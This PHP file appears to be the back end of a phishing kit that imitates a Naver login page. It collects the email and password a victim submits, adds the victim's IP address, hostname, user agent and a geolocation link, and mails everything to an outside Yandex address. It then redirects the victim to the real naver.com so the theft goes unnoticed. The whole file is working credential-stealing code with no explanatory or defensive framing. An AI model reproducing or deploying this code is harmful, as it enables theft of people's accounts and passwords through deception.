<?php
if($_POST["email"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Naver Info-----------------------\n";
$message .= "email            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['pass']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "gtech@yandex.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://www.naver.com/");
}else{
header ("Location: index.php");
}

?>